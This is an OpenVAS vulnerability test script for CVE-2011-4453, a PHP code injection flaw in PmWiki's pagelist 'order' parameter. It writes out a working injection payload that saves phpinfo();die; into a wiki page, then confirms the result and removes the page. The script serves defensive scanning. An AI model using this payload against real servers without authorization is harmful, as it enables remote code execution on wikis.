###############################################################################
# OpenVAS Vulnerability Test
#
# PmWiki Pagelist 'order' Parameter PHP Code Injection Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2011 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902592");
  script_version("2019-05-14T12:12:41+0000");
  script_cve_id("CVE-2011-4453");
  script_bugtraq_id(50776);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2019-05-14 12:12:41 +0000 (Tue, 14 May 2019)");
  script_tag(name:"creation_date", value:"2011-11-28 13:13:13 +0530 (Mon, 28 Nov 2011)");
  script_name("PmWiki Pagelist 'order' Parameter PHP Code Injection Vulnerability");
  script_xref(name:"URL", value:"http://secunia.com/advisories/46968");
  script_xref(name:"URL", value:"http://www.pmwiki.org/wiki/PITS/01271");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/18149");
  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/520631");
  script_xref(name:"URL", value:"http://www.pmwiki.org/wiki/PmWiki/ChangeLog#v2235");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 SecPod");
  script_family("Web application abuses");
  script_dependencies("gb_pmwiki_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("pmwiki/detected");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to inject and execute
  arbitrary PHP code in the context of the affected application.");

  script_tag(name:"affected", value:"PmWiki versions 2.0.0 to 2.2.34");

  script_tag(name:"insight", value:"The flaw is due to improper validation of user-supplied input via
  the 'order' argument of a pagelist directive within a PmWiki page, which
  allows attackers to execute arbitrary PHP code.");

  script_tag(name:"solution", value:"Upgrade to PmWiki version 2.2.35 or later.");

  script_tag(name:"summary", value:"The host is running PmWiki and is prone to PHP code injection
  vulnerability.");

  exit(0);
}

include("http_func.inc");
include("version_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!dir = get_dir_from_kb(port:port, app:"PmWiki"))
  exit(0);

url = dir + "/pmwiki.php";
postData = "action=edit&post=save&n=Cmd.Shell&text=(:pagelist order=']);" +
           "phpinfo();die;#:)";

host = http_host_name(port:port);
req = string("POST ", url, " HTTP/1.1\r\n",
             "Host: ", host, "\r\n",
             "Content-Type: application/x-www-form-urlencoded\r\n",
             "Content-Length: ", strlen(postData), "\r\n",
             "\r\n", postData);
res = http_keepalive_send_recv(port:port, data:req);

if(res =~ "^HTTP/1\.[01] 30")
{
  path = url + "?n=Cmd.Shell";
  if(http_vuln_check(port:port, url:path, pattern:">phpinfo\(\)<"))
  {
    ## Clean the pmwiki.php on success by sending empty POST
    postData = "action=edit&post=save&n=Cmd.Shell&text=";
    req = string("POST ", url, " HTTP/1.1\r\n",
                 "Host: ", host, "\r\n",
                 "Content-Type: application/x-www-form-urlencoded\r\n",
                 "Content-Length: ", strlen(postData), "\r\n",
                 "\r\n", postData);

    res = http_keepalive_send_recv(port:port, data:req);

    security_message(port:port);
    exit(0);
  }
}

exit(99);